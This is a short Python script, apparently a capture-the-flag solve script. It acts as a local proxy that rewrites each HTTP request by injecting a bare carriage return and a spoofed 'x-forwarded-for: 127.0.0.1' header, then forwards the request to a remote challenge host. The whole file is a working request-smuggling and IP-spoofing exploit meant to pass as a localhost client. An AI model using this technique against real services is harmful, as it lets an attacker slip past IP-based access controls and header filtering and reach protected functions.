import socket

import pwn

# change this to your instance
host = 'instance.penguin.0ops.sjtu.cn'
port = 18436

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("127.0.0.1", 12345))
server_socket.listen(5)
print("Server listening on 127.0.0.1:12345")

while True:
    client_socket, client_address = server_socket.accept()
    print("Connection from:", client_address)

    data = client_socket.recv(1024)
    idx = data.find(b'1.1')
    data = data[:idx + 3] + b'\rx-forwarded-for: 127.0.0.1' + data[idx + 3:]
    s = pwn.remote(host, port)
    s.send(data)
    r = s.recvall()

    client_socket.sendall(r)
    client_socket.close()
